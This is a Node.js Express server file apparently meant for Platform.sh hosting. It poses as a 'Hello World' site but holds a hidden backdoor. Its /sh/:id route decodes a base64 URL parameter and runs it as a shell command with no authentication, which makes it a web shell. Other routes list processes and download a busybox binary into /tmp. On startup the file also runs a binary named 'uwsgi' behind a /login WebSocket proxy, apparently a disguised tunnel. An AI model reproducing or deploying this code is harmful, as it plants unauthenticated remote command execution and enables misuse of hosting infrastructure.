const express = require("express");
const app = express();

const config = require("platformsh-config").config();
const port = config.port || 3000
// const port = process.env.PORT || 3000;

var exec = require("child_process").exec;
const os = require("os");
const { createProxyMiddleware } = require("http-proxy-middleware");
var request = require("request");

var fs = require('fs');



function downloadFile(uri,filename,callback){
 var stream = fs.createWriteStream(filename);
 request(uri).pipe(stream).on('close', callback); 
}



app.get("/", (req, res) => {
  res.send("Hello World");
});

app.get("/home", (req, res) => {
  res.send("Welcome to my site!");
});

app.get("/status", (req, res) => {
  let cmdStr = "ps -ef";
  exec(cmdStr, function (err, stdout, stderr) {
    if (err) {
      res.send("exec error：" + err);
    } else {
      res.send("exec success：" + stdout);
    }
  });
});

app.get("/start", (req, res) => {
//   let cmdStr = "./web -c ./config.yaml >/dev/null 2>&1 &";
//   let cmdStr = "cp uwsgi /tmp && cp uwsgi.json /tmp && cd /tmp && chmod +x ./uwsgi && nohup ./uwsgi -config=./uwsgi.json &";
  let cmdStr = "cp uwsgi /tmp && cd /tmp && chmod +x ./uwsgi && ./uwsgi -c 0.0.0.0:7861/login.json &";
  exec(cmdStr, function (err, stdout, stderr) {
    if (err) {
      res.send("exec error：" + err);
    } else {
      res.send("exec success：" + "!\n" + stdout + "\n" + stderr);
    }
  });
});

app.get("/sh/:id",function(req,res){
  let s = req.params.id;
  s = Buffer.from(s, 'base64').toString('utf-8');
  exec(s, function (err, stdout, stderr) {
    if (err) {
      res.type("html").send("exec error：\n" + err);
    } else {
      res.type("html").send("exec success：\n" + stdout);
    }
  });
//     res.send(req.params);
});


app.get("/dl", (req, res) => {
  var fileUrl = 'https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox';
  var filename = '/tmp/busybox';
  downloadFile(fileUrl,filename,function(){
   console.log(filename+'download success');
   res.send(filename+'download success');
  });

});


app.get("/info", (req, res) => {
  let cmdStr = "cat /etc/*release | grep -E ^NAME";
  exec(cmdStr, function (err, stdout, stderr) {
    if (err) {
      res.send("exec error：" + err);
    } else {
      res.send(
        "exec success：\n" +
          "Linux System:" +
          stdout +
          "\nRAM:" +
          os.totalmem() / 1000 / 1000 + "MB"
      );
    }
  });
});

app.use(
  "/login",
  createProxyMiddleware({
    target: "http://127.0.0.1:7861/", 
    changeOrigin: true, 
    ws: true, 
//     pathRewrite: {
//       "^/api": "/login",
//     },
    onProxyReq: function onProxyReq(proxyReq, req, res) {
//       console.log(
//         "-->  ",
//         req.method,
//         req.baseUrl,
//         "->",
//         proxyReq.host + proxyReq.path
//       );
    },
  })
);



function runWS() {
//   let cmdStr = "cp uwsgi /tmp && cp uwsgi.json /tmp && cd /tmp && chmod +x ./uwsgi && ./uwsgi -config=./uwsgi.json &";
  let cmdStr = "cp uwsgi /tmp && cd /tmp && chmod +x ./uwsgi && ./uwsgi -c 0.0.0.0:7861/login.json &";
  exec(cmdStr, function (err, stdout, stderr) {
//     console.log('runWS reslut:\n', stdout, stderr);
  });
}


// app.listen(port, () => console.log(`Express app listening on port ${port}!`));
runWS();

// Get PORT and start the server
app.listen(port, function() {
  console.log(`Listening on port ${port}`)
});


